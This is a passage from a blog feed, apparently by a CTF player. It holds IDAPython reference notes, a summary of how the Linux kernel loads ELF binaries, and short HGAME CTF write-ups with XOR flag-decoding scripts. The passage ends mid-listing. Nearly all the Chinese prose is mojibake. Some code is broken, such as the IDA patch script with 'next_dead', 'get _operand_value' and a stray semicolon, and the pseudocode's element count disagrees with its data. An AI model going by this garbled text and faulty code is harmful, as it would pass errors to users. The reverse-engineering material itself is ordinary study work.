next_head(now)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ FuncItems æ¥å®Œæˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for ea in FuncItems(here()):</span><br><span class="line">print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br></pre></td></tr></table></figure><h2 id="æŒ‡ä»¤"><a href="#æŒ‡ä»¤" class="headerlink" title="æŒ‡ä»¤"></a>æŒ‡ä»¤</h2><p>idaapi.decode_insn(out, ea)ï¼šè§£ææŒ‡ä»¤å¹¶å¡«å…… out (insn_t ç»“æ„ä½“)</p><p>ida_ua.insn_t()ï¼šnew ä¸€ä¸ª insn_t ç»“æ„ä½“</p><p>ä¾‹ï¼šæ‰¾åˆ°å‡½æ•°ä¸­æ‰€æœ‰çš„è·³è½¬æŒ‡ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for ea in FuncItems(here()):</span><br><span class="line">asm = generate_disasm_line(ea, 0)</span><br><span class="line">if &quot;jmp&quot; in asm:</span><br><span class="line">print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§å®ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMPS = [idaapi.NN_jmp, idaapi.NN_jmpfi, idaapi.NN_jmpni]</span><br><span class="line">for ea in FuncItems(here()):</span><br><span class="line">ins = ida_ua.insn_t()</span><br><span class="line">idaapi.decode_insn(ins, ea)</span><br><span class="line">if ins.itype in JMPS:</span><br><span class="line">print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br></pre></td></tr></table></figure><h2 id="æ“ä½œæ•°"><a href="#æ“ä½œæ•°" class="headerlink" title="æ“ä½œæ•°"></a><strong>æ“ä½œæ•°</strong></h2><p>å¯ä»¥ä½¿ç”¨ get_operand_type(ea, n) å¾—åˆ°æ“ä½œæ•°çš„ç±»å‹ã€‚get_operand_value(ea, n) æ¥å¾—åˆ°æ“ä½œæ•°çš„å€¼ã€‚ea æ˜¯åœ°å€ï¼Œn æ˜¯ç´¢å¼•ã€‚</p><p>è¿™é‡Œæœ‰ 8 ä¸­ä¸åŒç±»å‹çš„æ“ä½œæ•°ç±»å‹ã€‚</p><p><strong>o_void</strong> å¦‚æœä¸€ä¸ªæŒ‡ä»¤æ²¡æœ‰ä»»ä½•æ“ä½œæ•°å®ƒå°†è¿”å› 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0xa09166 retn</span><br><span class="line">Python&gt;print(get_operand_type(ea,0))</span><br><span class="line">&gt;&gt;&gt; 0</span><br></pre></td></tr></table></figure><p><strong>o_reg</strong> å¦‚æœä¸€ä¸ªæ“ä½œæ•°æ˜¯ä¸€ä¸ªæ™®éçš„å¯„å­˜å™¨å°†è¿”å›æ­¤ç±»å‹ã€‚è¿™ä¸ªå€¼åœ¨å†…éƒ¨è¡¨ç¤ºä¸º 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0xa09163 pop edi</span><br><span class="line">Python&gt;print(get_operand_type(ea,0))</span><br><span class="line">&gt;&gt;&gt; 1</span><br></pre></td></tr></table></figure><p><strong>o_mem</strong> å¦‚æœä¸€ä¸ªæ“ä½œæ•°æ˜¯ç›´æ¥å†…å­˜å¼•ç”¨å®ƒå°†è¿”å›è¿™ä¸ªç±»å‹ã€‚è¿™ä¸ªå€¼åœ¨å†…éƒ¨è¡¨ç¤ºä¸º 2ã€‚è¿™ç§ç±»å‹æ˜¯æœ‰ç”¨çš„åœ¨ DATA æ®µæŸ¥æ‰¾å¼•ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0xa05d86 cmp ds:dword_A152B8, 0</span><br><span class="line">Python&gt;print(get_operand_type(ea,0))</span><br><span class="line">&gt;&gt;&gt; 2</span><br></pre></td></tr></table></figure><p><strong>o_phrase</strong> è¿™ä¸ªæ“ä½œæ•°è¢«è¿”å›åˆ™è¿™ä¸ªæ“ä½œæ•°åŒ…å«ä¸€ä¸ªåŸºæœ¬çš„å¯„å­˜å™¨æˆ–ä¸€ä¸ªç´¢å¼•å¯„å­˜å™¨ã€‚è¿™ä¸ªå€¼åœ¨å†…éƒ¨è¡¨ç¤ºä¸º 3ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0x1000b8c2 mov [edi+ecx], eax</span><br><span class="line">Python&gt;print(get_operand_type(ea,0))</span><br><span class="line">&gt;&gt;&gt; 3</span><br></pre></td></tr></table></figure><p><strong>o_displ</strong> è¿™ä¸ªæ“ä½œæ•°è¢«è¿”å›åˆ™æ“ä½œæ•°åŒ…å«å¯„å­˜å™¨å’Œä¸€ä¸ªä½ç§»å€¼ï¼Œè¿™ä¸ªä¸ºä½ç§»å€¼æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œä¾‹å¦‚ 0x18ã€‚</p><p>è¿™æ˜¯å¸¸è§çš„å½“ä¸€æ¡æŒ‡ä»¤è®¿é—®å€¼åœ¨ä¸€ä¸ªç»“æ„ä¸­ã€‚åœ¨å†…éƒ¨ï¼Œå®ƒè¡¨ç¤ºä¸º 4 çš„å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0xa05dc1 mov eax, [edi+18h]</span><br><span class="line">Python&gt;print(get_operand_type(ea,1))</span><br><span class="line">&gt;&gt;&gt; 4</span><br></pre></td></tr></table></figure><p><strong>o_imm</strong> æ“ä½œæ•°æ˜¯è¿™æ ·ä¸€ä¸ªä¸ºæ•´æ•°çš„ 0xc çš„å€¼çš„ç±»å‹ã€‚å®ƒåœ¨å†…éƒ¨è¡¨ç¤ºä¸º 5ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0xa05da1 add esp, 0Ch</span><br><span class="line">Python&gt;print(get_operand_type(ea,1))</span><br><span class="line">&gt;&gt;&gt; 5</span><br></pre></td></tr></table></figure><p><strong>o_far</strong> æ˜¯ç”¨æ¥å¯»æ‰¾æ“ä½œæ•°çš„è®¿é—®ç«‹å³æ•°è¿œåœ°å€çš„ã€‚å®ƒåœ¨å†…éƒ¨è¡¨ç¤ºä¸º 6ã€‚</p><p><strong>o_near</strong> æ˜¯ç”¨æ¥å¯»æ‰¾æ“ä½œæ•°çš„è®¿é—®ç«‹å³æ•°è¿‘åœ°å€çš„ã€‚å®ƒåœ¨å†…éƒ¨è¡¨ç¤ºä¸º 7ã€‚</p><h2 id="æ•°æ®è¯»å†™"><a href="#æ•°æ®è¯»å†™" class="headerlink" title="æ•°æ®è¯»å†™"></a>æ•°æ®è¯»å†™</h2><ul><li>get_bytes(ea, size)</li><li>ida_bytes.get_byte(ea)</li><li>ida_bytes.get_word(ea)</li><li>ida_bytes.get_dword(ea)</li><li>ida_bytes.get_qword(ea)</li><li>ida_bytes.patch_bytes(ea, buf)</li><li>ida_bytes.patch_byte(ea, val)</li><li>ida_bytes.patch_word(ea, val)</li><li>ida_bytes.patch_dword(ea, val)</li><li>ida_bytes.patch_qword(ea, val)</li></ul><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><ul><li>add_bpt(ea)ï¼šæ·»åŠ æ–­ç‚¹</li><li>del_bpt(ea)ï¼šåˆ é™¤æ–­ç‚¹</li><li>start_process(path, args, sdir)ï¼šå¯åŠ¨è°ƒè¯•</li><li>step_into()ï¼šæ­¥å…¥</li><li>step_over()ï¼šæ­¥è¿‡</li><li>step_until_ret()ï¼šæ‰§è¡Œåˆ°è¿”å›</li><li>get_reg_value(regname)ï¼šè·å–å¯„å­˜å™¨å€¼</li><li>set_reg_value(value, regname)ï¼šè®¾ç½®å¯„å­˜å™¨å€¼</li><li>wait_for_next_event(wfne, timeout)ï¼šç­‰å¾…è°ƒè¯•äº‹ä»¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸€èˆ¬å–ä¸º WFNE_SUSP</li></ul><h3 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">addr= <span class="number">0x401198</span></span><br><span class="line">end = get_func_attr(addr,FUNCATTR_END)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr&lt;end:</span><br><span class="line">    next_ins=next_head(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;dword_603054&quot;</span> <span class="keyword">in</span> generate_disasm_line(addr,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            addr = next_dead(addr)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;jnz&quot;</span> <span class="keyword">in</span> generate_disasm_line(addr,<span class="number">0</span>):</span><br><span class="line">                dest = get _operand_value(addr,<span class="number">0</span>)</span><br><span class="line">                offset = dest-(addr+<span class="number">5</span>)</span><br><span class="line">                <span class="built_in">print</span>(offset)</span><br><span class="line">                </span><br><span class="line">                ida_bytes.patch_byte(addr,<span class="number">0xE9</span>)</span><br><span class="line">                addr = next_ins</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addr=next_ins</span><br></pre></td></tr></table></figure><h1 id="ELF-è¿è¡Œæµç¨‹"><a href="#ELF-è¿è¡Œæµç¨‹" class="headerlink" title="ELF è¿è¡Œæµç¨‹"></a><strong>ELF</strong> è¿è¡Œæµç¨‹</h1><h2 id="é™æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥"></a>é™æ€é“¾æ¥</h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240201223812328.png" alt="image-20240201223812328"></p><h2 id="åŠ¨æ€é“¾æ¥"><a href="#åŠ¨æ€é“¾æ¥" class="headerlink" title="åŠ¨æ€é“¾æ¥"></a><strong>åŠ¨æ€é“¾æ¥</strong></h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240201223823579.png" alt="image-20240201223823579"></p><h2 id="åŸºæœ¬æ“ä½œè¯´æ˜"><a href="#åŸºæœ¬æ“ä½œè¯´æ˜" class="headerlink" title="åŸºæœ¬æ“ä½œè¯´æ˜"></a><strong>åŸºæœ¬æ“ä½œè¯´æ˜</strong></h2><h3 id="sys-execve"><a href="#sys-execve" class="headerlink" title="sys_execve"></a><strong>sys_execve</strong></h3><p>è¯¥å‡½æ•°ä¸»è¦ç”¨äºæ‰§è¡Œä¸€ä¸ªæ–°çš„ç¨‹åºï¼Œå³æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ç¨‹åºï¼Œä¼šæ£€æŸ¥ç›¸åº”çš„ argv ä»¥åŠ envp ç­‰å‚</p><p>æ•°ã€‚</p><h3 id="do-execve"><a href="#do-execve" class="headerlink" title="do_execve"></a><strong>do_execve</strong></h3><p>è¯¥å‡½æ•°æ‰“å¼€ç›®æ ‡æ˜ åƒæ–‡ä»¶ï¼Œå¹¶ä»ç›®æ ‡æ–‡ä»¶çš„å¼€å§‹å¤„è¯»å…¥æŒ‡å®šé•¿åº¦çš„ï¼ˆç›®å‰ä¸º128ï¼‰å­—èŠ‚æ¥è·å–ç›¸åº”ç›®æ ‡</p><p>æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ã€‚</p><h3 id="search-binary-handler"><a href="#search-binary-handler" class="headerlink" title="search_binary_handler"></a><strong>search_binary_handler</strong></h3><p>è¯¥å‡½æ•°ä¼šæœç´¢æ”¯æŒå¤„ç†å½“å‰ç±»å‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ç±»å‹é˜Ÿåˆ—ï¼Œä»¥ä¾¿äºè®©å„ç§å¯æ‰§è¡Œç¨‹åºçš„å¤„ç†ç¨‹åºè¿›è¡Œç›¸åº”</p><p>çš„å¤„ç†ã€‚</p><h3 id="load-elf-binary"><a href="#load-elf-binary" class="headerlink" title="load_elf_binary"></a><strong>load_elf_binary</strong></h3><p>è¯¥å‡½æ•°çš„ä¸»è¦å¤„ç†æµç¨‹å¦‚ä¸‹</p><ul><li><p>-æ£€æŸ¥å¹¶è·å– elf æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯</p></li><li><p>å¦‚æœç›®æ ‡æ–‡ä»¶é‡‡ç”¨åŠ¨æ€é“¾æ¥ï¼Œåˆ™ä½¿ç”¨ .interp èŠ‚æ¥ç¡®å®š loader çš„è·¯å¾„ã€‚</p></li><li><p>å°† program header ä¸­è®°å½•çš„ç›¸åº”çš„æ®µæ˜ å°„åˆ°å†…å­˜ä¸­ã€‚program header ä¸­æœ‰ä»¥ä¸‹é‡è¦ä¿¡æ¯</p><ul><li>æ¯ä¸€ä¸ªæ®µéœ€è¦æ˜ å°„åˆ°çš„åœ°å€</li><li>æ¯ä¸€ä¸ªæ®µç›¸åº”çš„æƒé™</li><li>è®°å½•å“ªäº›èŠ‚å±äºå“ªäº›æ®µ</li></ul></li></ul><p>å…·ä½“çš„æ˜ å°„å¦‚ä¸‹</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240201223854316.png" alt="image-20240201223854316"></p><p>åˆ†æƒ…å†µå¤„ç†</p><ul><li><p>åŠ¨æ€é“¾æ¥æƒ…å†µä¸‹ï¼Œå°† sys_execve çš„è¿”å›åœ°å€æ”¹ä¸º loader(ld.so) çš„ entry point</p></li><li><p>é™æ€é“¾æ¥æƒ…å†µä¸‹ï¼Œå°† sys_execve çš„è¿”å›åœ°å€æ”¹ä¸ºç¨‹åºçš„å…¥å£ç‚¹</p></li></ul><h3 id="ld-so"><a href="#ld-so" class="headerlink" title="ld.so"></a><strong>ld.so</strong></h3><p>è¯¥æ–‡ä»¶æœ‰ä»¥ä¸‹åŠŸèƒ½</p><ul><li>ä¸»è¦ç”¨äºè½½å…¥ ELF æ–‡ä»¶ä¸­ DT_NEED ä¸­è®°å½•çš„å…±äº«åº“</li><li>åˆå§‹åŒ–å·¥ä½œ</li><li>åˆå§‹åŒ– GOT è¡¨</li><li>å°† symbol table åˆå¹¶åˆ° global symbol table</li></ul><h3 id="start"><a href="#start" class="headerlink" title="_start"></a><strong>_start</strong></h3><ul><li>_start å‡½æ•°ä¼šå°†ä»¥ä¸‹é¡¹ç›®äº¤ç»™ libc_start_main</li><li>ç¯å¢ƒå˜é‡èµ·å§‹åœ°å€</li><li>.init</li><li>å¯åŠ¨ main å‡½æ•°å‰çš„åˆå§‹åŒ–å·¥ä½œ</li><li>.fini</li><li>ç¨‹åºç»“æŸå‰çš„æ”¶å°¾å·¥ä½œ</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDAPythonå¸¸ç”¨å‡½æ•°&quot;&gt;&lt;a href=&quot;#IDAPythonå¸¸ç”¨å‡½æ•°&quot; class=&quot;headerlink&quot; title=&quot;IDAPythonå¸¸ç”¨å‡½æ•°&quot;&gt;&lt;/a&gt;IDAPythonå¸¸ç”¨å‡½æ•°&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://hex-rays.</summary>
      
    
    
    
    
    <category term="IDA Python" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/IDA-Python/"/>
    
  </entry>
  
  <entry>
    <title>æœ€è¿‘æ‰“çš„ä¸€äº›æ¯”èµ›</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/31/%E6%9C%80%E8%BF%91%E6%89%93%E6%AF%94%E8%B5%9B%E7%9A%84%E4%B8%80%E4%BA%9Bwriteup/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/31/%E6%9C%80%E8%BF%91%E6%89%93%E6%AF%94%E8%B5%9B%E7%9A%84%E4%B8%80%E4%BA%9Bwriteup/</id>
    <published>2024-01-30T16:00:00.000Z</published>
    <updated>2024-02-04T11:58:25.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HGAME-20240129"><a href="#HGAME-20240129" class="headerlink" title="HGAME 20240129"></a>HGAME 20240129</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>æ—¥å¸¸å…³æ³¨å¾®ä¿¡å·â€“flag</p><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><p>ä¾§ç€çœ‹ç€å›¾ç‰‡wï¼ˆç»å…¸</p><h3 id="simpleâ€”â€”attack"><a href="#simpleâ€”â€”attack" class="headerlink" title="simpleâ€”â€”attack"></a>simpleâ€”â€”attack</h3><p>æ˜æ–‡çˆ†ç ´zip</p><h3 id="æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™"><a href="#æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™" class="headerlink" title="æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™"></a>æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™</h3><p>å…­ä½å¼±åŠ å¯†</p><h3 id="å¸Œå„¿å¸Œå„¿å¸Œå°”"><a href="#å¸Œå„¿å¸Œå„¿å¸Œå°”" class="headerlink" title="å¸Œå„¿å¸Œå„¿å¸Œå°”"></a>å¸Œå„¿å¸Œå„¿å¸Œå°”</h3><p>å¸Œå°”åŠ å¯†ï¼Œä½†æ˜¯å›¾ç‰‡æ€ä¹ˆä¿®å¤ï¼Ÿ</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h3><p>æ‰“å¼€IDAå°±æ˜¯</p><h3 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a>ezUPX</h3><p>UPXè„±å£³ï¼Œçœ‹ä¼ªä»£ç ï¼Œ</p><p>flag xor 0x32 åä¸ºä¸€ä¸ªæ•°ç»„</p><p>å†™å…¥010editorï¼Œè½¬æ¢ä¸€ä¸‹å°±å‡ºæ¥äº†</p><p>ï¼ˆä¸€å®šè¦æŠ„å¯¹ï¼ˆï¼ˆåˆ«æŠ„ï¼Œç›´æ¥shift eå¯¼å‡ºï¼ˆï¼ˆ</p><h3 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h3><p>æ ¹æ®æ±‡ç¼–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">data:</span><br><span class="line">    c = [74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34]</span><br><span class="line">    flag = [0, 0, ..., 0]  # 33 elements initialized to 0</span><br><span class="line">    format = &quot;plz input your flag: &quot;</span><br><span class="line">    success = &quot;Congratulations!&quot;</span><br><span class="line">    failure = &quot;Sry, plz try again&quot;</span><br><span class="line"></span><br><span class="line">text:</span><br><span class="line">    function check_flag():</span><br><span class="line">        esi = 0</span><br><span class="line">        while esi &lt; 33:</span><br><span class="line">            temp = flag[esi] XOR 0x22</span><br><span class="line">            if temp != c[esi]:</span><br><span class="line">                return false</span><br><span class="line">            esi += 1</span><br><span class="line">        return true</span><br><span class="line"></span><br><span class="line">    procedure _start():</span><br><span class="line">        # Print prompt</span><br><span class="line">        system_call(4, 1, format, 20)</span><br><span class="line"></span><br><span class="line">        # Read user input</span><br><span class="line">        system_call(3, 0, flag, 33)</span><br><span class="line"></span><br><span class="line">        # Check flag</span><br><span class="line">        if check_flag():</span><br><span class="line">            # Print success message</span><br><span class="line">            system_call(4, 1, success, 14)</span><br><span class="line">        else:</span><br><span class="line">            # Print failure message</span><br><span class="line">            system_call(4, 1, failure, 18)</span><br><span class="line"></span><br><span class="line">        # Exit</span><br><span class="line">        system_call(1, 0, 0)</span><br><span class="line"></span><br><span class="line">    function system_call(eax, ebx, ecx, edx):</span><br><span class="line">        # Simulate system call</span><br><span class="line">        # This function depends on the specific system&#x27;s calling convention</span><br><span class="line">        # and how system calls are made (e.g., int 0x80 in this case).</span><br><span class="line"></span><br><span class="line">    # Entry point</span><br><span class="line">    _start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å†™è„šæœ¬å‡º</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor_with_0x22</span>(<span class="params">byte_array</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> byte_array:</span><br><span class="line">       hex_value = <span class="built_in">hex</span>(byte)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">       xor_result = <span class="built_in">hex</span>(byte ^ <span class="number">0x22</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">       result.append((hex_value, xor_result))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">byte_array = [<span class="number">74</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">113</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">79</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">125</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">17</span>, <span class="number">95</span>, <span class="number">34</span>]</span><br><span class="line"></span><br><span class="line">result = xor_with_0x22(byte_array)</span><br><span class="line"><span class="keyword">for</span> hex_value, xor_result <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;hex_value&#125;</span> XOR 0x22 = <span class="subst">&#123;xor_result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h3><p>æ„Ÿè§‰æ˜¯æ§åˆ¶æµå¹³å¦åŒ–åçš„ç¨‹åºã€‚æ²¡åšå‡ºæ¥</p><p>æ€€ç–‘æ˜¯python deflat.py -f ezPYC.exe â€“addr 0x140008F41 ç•™ä¸€ä¸‹</p><p>å“ˆå“ˆï¼Œä¸æ˜¯ï¼Œå°±æ˜¯æ™®é€špyc</p><p>åˆšå­¦äº†ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.8</span></span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line">    <span class="number">87</span>,</span><br><span class="line">    <span class="number">75</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">117</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">55</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">51</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">91</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">119</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">49</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span 